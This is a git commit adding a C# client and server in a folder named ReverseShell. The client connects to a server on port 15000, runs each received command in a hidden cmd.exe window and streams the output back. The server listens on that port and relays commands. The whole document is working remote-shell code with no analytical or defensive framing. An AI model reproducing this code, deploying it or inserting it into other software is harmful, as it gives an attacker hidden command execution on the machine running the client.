3b8a0678cb710644dd9a0c03302b682f908218d6
Juyeong J <juyeong.j@sysnetwork.co.kr>
2022-12-20 21:22:38 +0900

    C# #1

---
+++ ReverseShell/Client/Program.cs
@@ -0,0 +1,159 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Reflection.Emit;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Client
+{
+    public class AsyncObject
+    {
+        public byte[] Buffer;
+        public Socket WorkingSocket;
+        public readonly int BufferSize;
+        public AsyncObject(int bufferSize)
+        {
+            BufferSize = bufferSize;
+            Buffer = new byte[BufferSize];
+        }
+
+        public void ClearBuffer()
+        {
+            Array.Clear(Buffer, 0, BufferSize);
+        }
+    }
+    internal class Program
+    {
+        static Socket mainSock;
+        private static string commandstart(string com)
+        {
+            System.Diagnostics.ProcessStartInfo proInfo = new System.Diagnostics.ProcessStartInfo();
+            System.Diagnostics.Process pro = new System.Diagnostics.Process();
+            proInfo.FileName = "cmd.exe";
+            proInfo.CreateNoWindow = true;
+            proInfo.UseShellExecute = false;
+            proInfo.RedirectStandardOutput = true;
+            proInfo.RedirectStandardInput = true;
+            proInfo.RedirectStandardError = true;
+
+            pro.StartInfo = proInfo;
+            pro.Start();
+
+            pro.StandardInput.Write(com + Environment.NewLine);
+            pro.StandardInput.Close();
+
+            string returnvalue = pro.StandardOutput.ReadToEnd();
+            pro.WaitForExit();
+            pro.Close();
+            return returnvalue;
+        }
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    Send_Data(strOutput.ToString());
+                }
+                catch (Exception err) { }
+            }
+        }
+        static void Connect_Server(string ipaddr, int _port)
+        {
+            if (mainSock.Connected)
+            {
+                return;
+            }
+            try { mainSock.Connect(new IPEndPoint(IPAddress.Parse(ipaddr), _port)); }
+            catch (Exception ex)
+            {
+                return;
+            }
+
+            Console.WriteLine("System Connected.");
+
+            AsyncObject obj = new AsyncObject(4096);
+            obj.WorkingSocket = mainSock;
+            mainSock.BeginReceive(obj.Buffer, 0, obj.BufferSize, 0, DataReceived, obj);
+        }
+        static void DataReceived(IAsyncResult ar)
+        {
+            AsyncObject obj = (AsyncObject)ar.AsyncState;
+            int received;
+            try
+            {
+                received = obj.WorkingSocket.EndReceive(ar);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Server Disconnected");
+                mainSock.Close();
+                mainSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
+                return;
+            }
+
+            if (received <= 0)
+            {
+                obj.WorkingSocket.Close();
+                return;
+            }
+
+            string text = Encoding.UTF8.GetString(obj.Buffer);
+            string msg = text;
+            msg = msg.Trim('\0');
+            Console.WriteLine(msg);
+            StringBuilder strInput = new StringBuilder();
+
+            Process p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.CreateNoWindow = true;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardInput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+            p.Start();
+            p.BeginOutputReadLine();
+
+            strInput.Append(msg);
+            //strInput.Append("\n");
+            p.StandardInput.WriteLine(strInput);
+            strInput.Remove(0, strInput.Length);
+
+            obj.ClearBuffer();
+
+            obj.WorkingSocket.BeginReceive(obj.Buffer, 0, 4096, 0, DataReceived, obj);
+        }
+        static void Send_Data(string tts)
+        {
+            if (!mainSock.IsBound)
+            {
+                Console.WriteLine("Server Not Opened");
+                return;
+            }
+            byte[] bDts = Encoding.UTF8.GetBytes(tts);
+
+            mainSock.Send(bDts);
+        }
+
+        static void Main(string[] args)
+        {
+            mainSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
+            string ipaddr = Console.ReadLine();
+            Connect_Server(ipaddr, 15000);
+            while(true)
+            {
+                string s = Console.ReadLine();
+                Send_Data(s);
+
+            }
+        }
+    }
+}
---
+++ ReverseShell/Server/Program.cs
@@ -0,0 +1,139 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Threading;
+
+namespace Server
+{
+    public class AsyncObject
+    {
+        public byte[] Buffer;
+        public Socket WorkingSocket;
+        public readonly int BufferSize;
+        public AsyncObject(int bufferSize)
+        {
+            BufferSize = bufferSize;
+            Buffer = new byte[BufferSize];
+        }
+
+        public void ClearBuffer()
+        {
+            Array.Clear(Buffer, 0, BufferSize);
+        }
+    }
+    internal class Program
+    {
+        static Socket mainSock;
+        static IPAddress thisAddress;
+
+        static void Start_Server(int _port)
+        {
+            IPEndPoint serverEP = new IPEndPoint(IPAddress.Any, _port);
+            mainSock.Bind(serverEP);
+            mainSock.Listen(10);
+
+            mainSock.BeginAccept(AcceptCallback, null);
+        }
+
+        static List<Socket> connectedClients = new List<Socket>();
+        static void AcceptCallback(IAsyncResult ar)
+        {
+            Socket client = mainSock.EndAccept(ar);
+
+            mainSock.BeginAccept(AcceptCallback, null);
+
+            AsyncObject obj = new AsyncObject(4096);
+            obj.WorkingSocket = client;
+
+            connectedClients.Add(client);
+
+            Console.WriteLine("Client Connected.");
+
+            client.BeginReceive(obj.Buffer, 0, 4096, 0, DataReceived, obj);
+        }
+
+        static void DataReceived(IAsyncResult ar)
+        {
+            AsyncObject obj = (AsyncObject)ar.AsyncState;
+            int received;
+            try
+            {
+                received = obj.WorkingSocket.EndReceive(ar);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Disconnected From Client.");
+                return;
+            }
+
+            if (received <= 0)
+            {
+                obj.WorkingSocket.Close();
+                return;
+            }
+
+            string text = Encoding.UTF8.GetString(obj.Buffer);
+            string msg = text;
+            msg = msg.Trim('\0');
+            Console.WriteLine(msg);
+
+            for (int i = connectedClients.Count - 1; i >= 0; i--)
+            {
+                Socket socket = connectedClients[i];
+                if (socket != obj.WorkingSocket)
+                {
+                    try { socket.Send(obj.Buffer); }
+                    catch
+                    {
+                        try { socket.Dispose(); } catch { }
+                        connectedClients.RemoveAt(i);
+                    }
+                }
+            }
+
+            obj.ClearBuffer();
+
+            obj.WorkingSocket.BeginReceive(obj.Buffer, 0, 4096, 0, DataReceived, obj);
+        }
+
+        static void Send_Data(string tts)
+        {
+            if (!mainSock.IsBound)
+            {
+                Console.WriteLine("서버가 실행되고 있지 않습니다!");
+                return;
+            }
+            if (string.IsNullOrEmpty(tts))
+            {
+                return;
+            }
+            byte[] bDts = Encoding.UTF8.GetBytes(tts);
+
+            for (int i = connectedClients.Count - 1; i >= 0; i--)
+            {
+                Socket socket = connectedClients[i];
+                try { socket.Send(bDts); }
+                catch
+                {
+                    try { socket.Dispose(); } catch { }
+                    connectedClients.RemoveAt(i);
+                }
+            }
+        }
+
+        static void Main(string[] args)
+        {
+            mainSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
+            Start_Server(15000);
+            while(true)
+            {
+                string s = Console.ReadLine();
+                Send_Data(s);
+            }
+        }
+    }
+}
